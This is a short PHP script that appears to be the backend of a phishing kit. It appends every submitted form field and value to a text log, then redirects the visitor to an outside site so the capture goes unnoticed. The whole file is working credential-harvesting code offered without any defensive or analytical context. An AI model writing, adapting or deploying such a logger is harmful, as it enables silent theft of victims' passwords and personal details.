<?php
$handle = fopen("logs_0612232157.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
header("Location: http://www.sh2sh.com/CF/toolkit");

exit;
?>
